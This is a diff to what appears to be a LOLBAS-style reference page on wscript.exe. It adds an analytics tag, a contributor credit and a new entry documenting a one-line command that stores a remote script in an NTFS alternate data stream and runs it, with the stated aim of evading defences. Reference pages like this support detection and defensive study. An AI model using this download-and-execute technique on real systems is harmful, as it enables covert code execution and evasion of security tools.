@@ -41,6 +41,14 @@
 <p>Used by Windows to execute scripts</p>
 
 
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-133649096-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-133649096-1');
+</script>
 
 <br>
 <p><b>Paths:</b> 
@@ -65,6 +73,9 @@
 	
 	Oddvar Moe - <a href="https://twitter.com/@oddvarmoe">@oddvarmoe</a>
 	<br>
+	
+	SaiLay(valen) - <a href="https://twitter.com/@404death">@404death</a>
+	<br>
 	 
 </p>
 <br>
@@ -86,6 +97,21 @@
 		Execute script stored in an alternate data stream
 		<br>
 		<pre><code>wscript c:\ads\file.txt:script.vbs</code></pre>
+		Usecase:Execute hidden code to evade defensive counter measures
+		<br>
+		Privileges required:User
+		<br>
+		OS:Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
+		<br>
+		Mitre:<a href="https://attack.mitre.org/wiki/Technique/T1096">T1096</a>
+		<br>
+		<br>
+		<br>
+		<br>
+	
+		Download and execute script stored in an alternate data stream
+		<br>
+		<pre><code>echo GetObject("script:https://raw.githubusercontent.com/sailay1996/misc-bin/master/calc.js") > %temp%\test.txt:hi.js && wscript.exe %temp%\test.txt:hi.js</code></pre>
 		Usecase:Execute hidden code to evade defensive counter measures
 		<br>
 		Privileges required:User
